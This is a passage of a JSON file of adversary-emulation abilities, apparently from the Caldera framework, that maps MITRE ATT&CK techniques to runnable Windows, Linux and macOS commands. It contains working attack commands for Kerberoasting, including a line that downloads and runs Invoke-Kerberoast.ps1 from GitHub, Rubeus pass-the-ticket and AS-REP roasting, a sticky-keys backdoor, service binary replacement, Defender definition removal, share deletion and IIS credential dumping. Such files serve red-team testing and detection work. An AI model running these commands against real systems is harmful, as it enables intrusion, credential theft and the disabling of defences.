controllers. Output will be via stdout.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "nltest.exe /dclist:%userdnsdomain%", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Remote System Discovery", "ability_id": "fcb5b04ee56a74c73f29b9eecb6d4b17", "technique_id": "T1018", "tactic": "discovery", "requirements": [], "name": "Remote System Discovery - nltest", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Powershell script that runs nslookup on cmd.exe against the local /24 network of the first network adaptor listed in ipconfig.\n\nUpon successful execution, powershell will identify the ip range (via ipconfig) and perform a for loop and execute nslookup against that IP range. Output will be via stdout.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$localip = ((ipconfig | findstr [0-9].\\.)[0]).Split()[-1]; $pieces = $localip.split(\".\"); $firstOctet = $pieces[0]; $secondOctet = $pieces[1]; $thirdOctet = $pieces[2]; foreach ($ip in 1..255 | % { \"$firstOctet.$secondOctet.$thirdOctet.$_\" } ) {cmd.exe /c nslookup $ip}", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Remote System Discovery", "ability_id": "13a0c78dbd8d3645db69540bfe7cd038", "technique_id": "T1018", "tactic": "discovery", "requirements": [], "name": "Remote System Discovery - nslookup", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Identify remote systems via ping sweep.\n\nUpon successful execution, cmd.exe will perform a for loop against the 192.168.1.1/24 network. Output will be via stdout.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Remote System Discovery", "ability_id": "bf4dc95d64c15935ed1db8c98bb21133", "technique_id": "T1018", "tactic": "discovery", "requirements": [], "name": "Remote System Discovery - ping sweep", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Identify remote systems via ping sweep.\n\nUpon successful execution, sh will perform a ping sweep on the 192.168.1.1/24 and echo via stdout if an IP is active.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "for ip in $(seq 1 254); do ping -c 1 192.168.1.$ip; [ $? -eq 0 ] && echo \"192.168.1.$ip UP\" || : ; done", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "for ip in $(seq 1 254); do ping -c 1 192.168.1.$ip; [ $? -eq 0 ] && echo \"192.168.1.$ip UP\" || : ; done", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Remote System Discovery", "ability_id": "1cac00896661be81f2dd242c94bb84be", "technique_id": "T1018", "tactic": "discovery", "requirements": [], "name": "Remote System Discovery - sweep", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "An adversary may attempt to trick the user into downloading RemotePC Software for use as a C2 channel. \nUpon successful execution, RemotePC will be executed. \n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Unregister-ScheduledTask -TaskName \"RemotePC\" -Confirm:$False -ErrorAction SilentlyContinue; Unregister-ScheduledTask -TaskName \"RPCServiceHealthCheck\" -Confirm:$False -ErrorAction SilentlyContinue; Unregister-ScheduledTask -TaskName \"ServiceMonitor\" -Confirm:$False -ErrorAction SilentlyContinue; Unregister-ScheduledTask -TaskName \"StartRPCService\" -Confirm:$False -ErrorAction SilentlyContinue      ; Stop-Process -Name \"RemotePCPerformance\" -force -erroraction silentlycontinue; Stop-Process -Name \"RPCPerformanceService\" -force -erroraction silentlycontinue; Stop-Process -Name \"RemotePCUIU\" -force -erroraction silentlycontinue; Stop-Process -Name \"RPCDownloader\" -force -erroraction silentlycontinue; Stop-Process -Name \"RemotePCService\" -force -erroraction silentlycontinue; Stop-Process -Name \"RPCService\" -force -erroraction silentlycontinue"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Start-Process $env:temp\\RemotePC.exe", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Remote Access Software", "ability_id": "b200c52b097fd12b22b3203e0035e55d", "technique_id": "T1219", "tactic": "command-and-control", "requirements": [], "name": "RemotePC Software Execution", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test will remove an account from the domain admins group\n", "repeatable": false, "privilege": "", "buckets": ["impact"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$PWord = ConvertTo-SecureString -String; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList; if((Get-ADUser;   Remove-ADGroupMember -Identity \"Domain Admins\" -Members; } else{;     write-host \"Error - Make sure #{remove_user} is in the domain admins group\" -foregroundcolor Red; }", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Account Access Removal", "ability_id": "3f71c3360964b1a8c81618eb963c05f9", "technique_id": "T1531", "tactic": "impact", "requirements": [], "name": "Remove Account From Domain Admin Group", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Administrative shares are hidden network shares created by Microsoft\u2019s Windows NT operating systems that grant system administrators \nremote access to every disk volume on a network-connected system. As Microsoft puts it, \u201cMissing administrative shares typically \nindicate that the computer in question has been compromised by malicious software.\nhttps://threatpost.com/conti-ransomware-gang-has-full-log4shell-attack-chain/177173/\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["net share ADMIN$ /UNLIMITED >nul 2>&1 && net share C$=C:\\ >nul 2>&1 && net share IPC$ >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "for %i in (C$ IPC$ ADMIN$) do net share %i /delete", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host: Network Share Connection Removal", "ability_id": "1b43591006b8e25b8df16ee52f0832bf", "technique_id": "T1070.005", "tactic": "defense-evasion", "requirements": [], "name": "Remove Administrative Shares", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Removes a Network Share utilizing the command_prompt\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "net share \\\\test\\share /delete", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host: Network Share Connection Removal", "ability_id": "d7c027c49b9819c836e9533c8d96eaaa", "technique_id": "T1070.005", "tactic": "defense-evasion", "requirements": [], "name": "Remove Network Share", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Removes a Network Share utilizing PowerShell\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Remove-SmbShare -Name \\\\test\\share; Remove-FileShare -Name \\\\test\\share", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host: Network Share Connection Removal", "ability_id": "6940ffd670787cd1c410997e66629573", "technique_id": "T1070.005", "tactic": "defense-evasion", "requirements": [], "name": "Remove Network Share PowerShell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Removing definition files would cause ATP to not fire for AntiMalware. Check MpCmdRun.exe man page for info on all arguments.\nOn later viersions of windows (1909+) this command fails even with admin due to inusfficient privelages. On older versions of windows the\ncommand will say completed.\n\nhttps://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify Tools", "ability_id": "197a322f46033d8c1e5011967a0bce41", "technique_id": "T1562.001", "tactic": "defense-evasion", "requirements": [], "name": "Remove Windows Defender Definition Files", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Remove the Zone.Identifier alternate data stream which identifies the file as downloaded from the internet.\nRemoving this allows more freedom in executing scripts in PowerShell and avoids opening files in protected view.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Set-Content -Path $env:tmp\\ReadMe.md -Stream Zone.Identifier -Value '[ZoneTransfer]','ZoneId=3'"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Unblock-File -Path $env:tmp\\ReadMe.md", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Subvert Trust Controls: Mark-of-the-Web Bypass", "ability_id": "7f0f5471543a6f188b0fbdc436c49fd9", "technique_id": "T1553.005", "tactic": "defense-evasion", "requirements": [], "name": "Remove the Zone.Identifier alternate data stream", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Emulates attack with a renamed Microsoft.Workflow.Compiler.exe running a .Net assembly that launches calc.exe\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": null, "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution", "ability_id": "037e77f3c330580a9fce977cb308966b", "technique_id": "T1218", "tactic": "defense-evasion", "requirements": [], "name": "Renamed Microsoft.Workflow.Compiler.exe Payload Executions", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Downloads an image from a URL and sets it as the desktop wallpaper.\n", "repeatable": false, "privilege": "", "buckets": ["impact"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["$updateWallpapercode = @' ; using System.Runtime.InteropServices; namespace Win32{;     public class Wallpaper{ ;         [DllImport(\"user32.dll\", CharSet=CharSet.Auto)] ;          static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ;          ;          public static void SetWallpaper(string thePath){ ;             SystemParametersInfo(20,0,thePath,3);         };     }; } ; '@; if (Test-Path -Path;      $orgImg = Get-Content -Path \"#{pointer_to_orginal_wallpaper}\";      add-type $updateWallpapercode ;      [Win32.Wallpaper]::SetWallpaper($orgImg); }; Remove-Item \"#{pointer_to_orginal_wallpaper}\" -ErrorAction Ignore; Remove-Item \"#{wallpaper_location}\" -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$url = \"#{url_of_wallpaper}\"; $imgLocation = \"#{wallpaper_location}\"; $orgWallpaper = (Get-ItemProperty -Path Registry::'HKEY_CURRENT_USER\\Control Panel\\Desktop\\' -Name WallPaper).WallPaper; $orgWallpaper | Out-File -FilePath \"#{pointer_to_orginal_wallpaper}\"; $updateWallpapercode = @' ; using System.Runtime.InteropServices; namespace Win32{;     public class Wallpaper{ ;         [DllImport(\"user32.dll\", CharSet=CharSet.Auto)] ;          static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ;          ;          public static void SetWallpaper(string thePath){ ;             SystemParametersInfo(20,0,thePath,3);         };     }; } ; '@; $wc = New-Object System.Net.WebClient  ; try{  ;     $wc.DownloadFile($url, $imgLocation);     add-type $updateWallpapercode ;     [Win32.Wallpaper]::SetWallpaper($imgLocation); } ; catch [System.Net.WebException]{  ;     Write-Host(\"Cannot download $url\") ;     add-type $updateWallpapercode ;     [Win32.Wallpaper]::SetWallpaper($imgLocation); } ; finally{    ;     $wc.Dispose()  ; }", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Defacement: Internal Defacement", "ability_id": "90adc98ddf396bb7cb3b90a1f090a0e0", "technique_id": "T1491.001", "tactic": "impact", "requirements": [], "name": "Replace Desktop Wallpaper", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This is an example technique. snmptrap.exe should be changed in the command\nbelow with the new desired service binary. Depending on the value of\nhost.service.modifiable this ability can damage the target system.\n", "repeatable": false, "privilege": "", "buckets": ["persistence"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["$exe = (Get-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Services\\#{host.service.modifiable}\").ImagePath.split()[0];\n$path = (Resolve-Path $exe).Path;\nIf (Test-Path ($path + \".saved\")) {\n  Remove-Item $path;\n  Move-Item -Path ($path + \".saved\") -Destination $path\n}"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$s = Get-Service -Name #{host.service.modifiable};\nif ($s.status -ne 'Stopped') { Stop-Service $s };\n$exe = (Get-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Services\\#{host.service.modifiable}\").ImagePath.split()[0];\n$path = (Resolve-Path $exe).Path;\nCopy-Item -Path $path -Destination ($path + \".saved\");\nCopy-Item -Path \"C:\\Windows\\System32\\snmptrap.exe\" -Destination $path", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Create or Modify System Process: Windows Service", "ability_id": "52771610-2322-44cf-816b-a7df42b4c086", "technique_id": "T1543.003", "tactic": "persistence", "requirements": [{"relationship_match": [{"source": "host.service.modifiable"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "Replace a service binary with alternate binary", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Replace sticky keys binary (sethc.exe) with cmd.exe\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["copy /Y C:\\Windows\\System32\\sethc_backup.exe C:\\Windows\\System32\\sethc.exe"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "IF NOT EXIST C:\\Windows\\System32\\sethc_backup.exe (copy C:\\Windows\\System32\\sethc.exe C:\\Windows\\System32\\sethc_backup.exe) ELSE ( pushd ) && takeown /F C:\\Windows\\System32\\sethc.exe /A && icacls C:\\Windows\\System32\\sethc.exe /grant Administrators:F /t && copy /Y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Event Triggered Execution: Accessibility Features", "ability_id": "84942e0bfed7ce40449941faec766c5e", "technique_id": "T1546.008", "tactic": "multiple", "requirements": [], "name": "Replace binary of sticky keys", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The following test will utilize native PowerShell Identity modules to query the domain to extract the Service Principal Names for a single computer. This behavior is typically used during a kerberos or silver ticket attack. \nA successful execution will output the SPNs for the endpoint in question.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Add-Type -AssemblyName System.IdentityModel; $ComputerFQDN=$env:LogonServer.trimStart('\\') + \".\" + $env:UserDnsDomain; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"HTTP/$ComputerFQDN\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Steal or Forge Kerberos Tickets: Kerberoasting", "ability_id": "91a18ae1efe4119a549cea2ac7de72c4", "technique_id": "T1558.003", "tactic": "credential-access", "requirements": [], "name": "Request A Single Ticket via PowerShell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The following test will utilize native PowerShell Identity modules to query the domain to extract allthe Service Principal Names. This behavior is typically used during a kerberos or silver ticket attack. \nA successful execution will output the SPNs for the domain in question.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Add-Type -AssemblyName System.IdentityModel  ; setspn.exe -T %USERDNSDOMAIN% -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Steal or Forge Kerberos Tickets: Kerberoasting", "ability_id": "2f03250355bb1403dcfac6808782a192", "technique_id": "T1558.003", "tactic": "credential-access", "requirements": [], "name": "Request All Tickets via PowerShell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test uses the Powershell Empire Module: Invoke-Kerberoast.ps1\nThe following are further sources and credits for this attack:\n[Kerberoasting Without Mimikatz source] (https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/)\n[Invoke-Kerberoast source] (https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/)\nwhen executed successfully , the test displays available services with their hashes. \nIf the testing domain doesn't have any service principal name configured, there is no output\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "if((Get-CIMInstance -Class Win32_ComputerSystem) { ; } else {Write-Host Joining this computer to a domain must be done manually};  ;  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/credentials/Invoke-Kerberoast.ps1 -UseBasicParsing); Invoke-Kerberoast | fl", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Steal or Forge Kerberos Tickets: Kerberoasting", "ability_id": "8b5f748da9647a4d9c5a37f20124ba9c", "technique_id": "T1558.003", "tactic": "credential-access", "requirements": [], "name": "Request for service tickets", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test restarts a Windows system.\n", "repeatable": false, "privilege": "", "buckets": ["impact"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "shutdown /r /t 1", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "System Shutdown/Reboot", "ability_id": "617ea9a1ca1df0d88fe31919dfbcdc90", "technique_id": "T1529", "tactic": "impact", "requirements": [], "name": "Restart System - Windows", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test restarts a macOS/Linux system via `reboot`.\n", "repeatable": false, "privilege": "", "buckets": ["impact"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "reboot", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "reboot", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "System Shutdown/Reboot", "ability_id": "9c179dc2e0bea7b2340e92c574926fc2", "technique_id": "T1529", "tactic": "impact", "requirements": [], "name": "Restart System via `reboot` - macOS/Linux", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test restarts a macOS/Linux system.\n", "repeatable": false, "privilege": "", "buckets": ["impact"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "shutdown -r now", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "shutdown -r now", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "System Shutdown/Reboot", "ability_id": "25bab84a1a63926a7cf7f56e4029ef15", "technique_id": "T1529", "tactic": "impact", "requirements": [], "name": "Restart System via `shutdown` - macOS/Linux", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "AppCmd.exe is a command line utility which is used for managing an IIS web server. The config command within the tool reveals the service account credentials configured for the webserver. An adversary may use these credentials for other malicious purposes.\n[Reference](https://twitter.com/0gtweet/status/1588815661085917186?cxt=HHwWhIDUyaDbzYwsAAAA)", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /config", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "OS Credential Dumping", "ability_id": "2cc37a6cf2f1acdeaa6a6638016444d1", "technique_id": "T1003", "tactic": "credential-access", "requirements": [], "name": "Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using config)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "AppCmd.exe is a command line utility which is used for managing an IIS web server. The list command within the tool reveals the service account credentials configured for the webserver. An adversary may use these credentials for other malicious purposes.\n[Reference](https://twitter.com/0gtweet/status/1588815661085917186?cxt=HHwWhIDUyaDbzYwsAAAA)", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /@t:*; C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /@text:*; C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /text:*", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "OS Credential Dumping", "ability_id": "f6c693da77b8824b3c52ba3b6ca0bf88", "technique_id": "T1003", "tactic": "credential-access", "requirements": [], "name": "Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using list)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Find hostname of remote IP in domain", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.reverse_nslookup", "parserconfigs": [{"custom_parser_vals": {}, "edge": "has_ip", "target": "remote.host.ip", "source": "remote.host.fqdn"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "nslookup #{remote.host.ip}", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Remote System Discovery", "ability_id": "fa4ed735-7006-4451-a578-b516f80e559f", "technique_id": "T1018", "tactic": "discovery", "requirements": [], "name": "Reverse nslookup IP", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Requesting a TGT on a remote system and retrieving it locally before requesting a service ticket with it. This is a Pass-The-Ticket attack because the TGT is obtained on the remote system, then used from a different machine (local).\nPsExec is used to execute commands on the remote system, and the \"C$\" admin share is used to retrieve the TGT, so the current user must have admin rights remotely and other PsExec prerequisites must be met.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "C:\\PSTools\\PsExec.exe -accepteula \\\\localhost -w c:\\ -c $Env:TEMP\\rubeus.exe asktgt /user:Administrator /password:Password /domain:$Env:USERDOMAIN /outfile:ticket.kirbi; Set-Location $env:TEMP; Move-Item -Force \"\\\\localhost\\c$\\ticket.kirbi\" ticket.kirbi; Write-Host \"Successfully retrieved TGT from 'localhost', now requesting a TGS from local\"; & \"$Env:TEMP\\rubeus.exe\" asktgs /service:cifs/localhost /ticket:ticket.kirbi /ptt; Remove-Item $env:TEMP\\ticket.kirbi; & \"$Env:TEMP\\rubeus.exe\" purge", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Use Alternate Authentication Material: Pass the Ticket", "ability_id": "e0d59dde7cd701edd5144a01d622a5f2", "technique_id": "T1550.003", "tactic": "multiple", "requirements": [], "name": "Rubeus Kerberos Pass The Ticket", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Information on the Rubeus tool and it's creators found here: https://github.com/GhostPack/Rubeus#asreproast\nThis build targets .NET 4.5.  If targeting a different version you will need to compile Rubeus\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item $Env:temp\\rubeus_output.txt -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "cmd.exe /c \"$Env:temp\\rubeus.exe\" asreproast /outfile:\"$Env:temp\\rubeus_output.txt\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Steal or Forge Kerberos Tickets: AS-REP Roasting", "ability_id": "e66e4283978c8df9077696ace360a507", "technique_id": "T1558.004", "tactic": "credential-access", "requirements": [], "name": "Rubeus asreproast", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Information on the Rubeus tool and it's creators found here: https://github.com/GhostPack/Rubeus#asreproast\nThis build targets .NET 4.5.  If targeting a different version you will need to compile Rubeus\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item $Env:temp\\rubeus_output.txt -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "klist purge; cmd.exe /c \"$Env:temp\\rubeus.exe\" kerberoast None /outfile:\"$Env:temp\\rubeus_output.txt\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Steal or Forge Kerberos Tickets: Kerberoasting", "ability_id": "268f529c68280d4cbd0aa06cf6438be8", "technique_id": "T1558.003", "tactic": "credential-access", "requirements": [], "name": "Rubeus kerberoast", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Upon execution SharpHound will be downloaded to disk, imported and executed. It will set up collection methods, run and then compress and store the data to the temp directory on the machine. If system is unable to contact a domain, proper execution will not occur.\n\nSuccessful execution will produce stdout message stating \"SharpHound Enumeration Completed\". Upon completion, final output will be a *BloodHound.zip file.\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item $env:Temp\\*BloodHound.zip -Force"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "write-host \"Import and 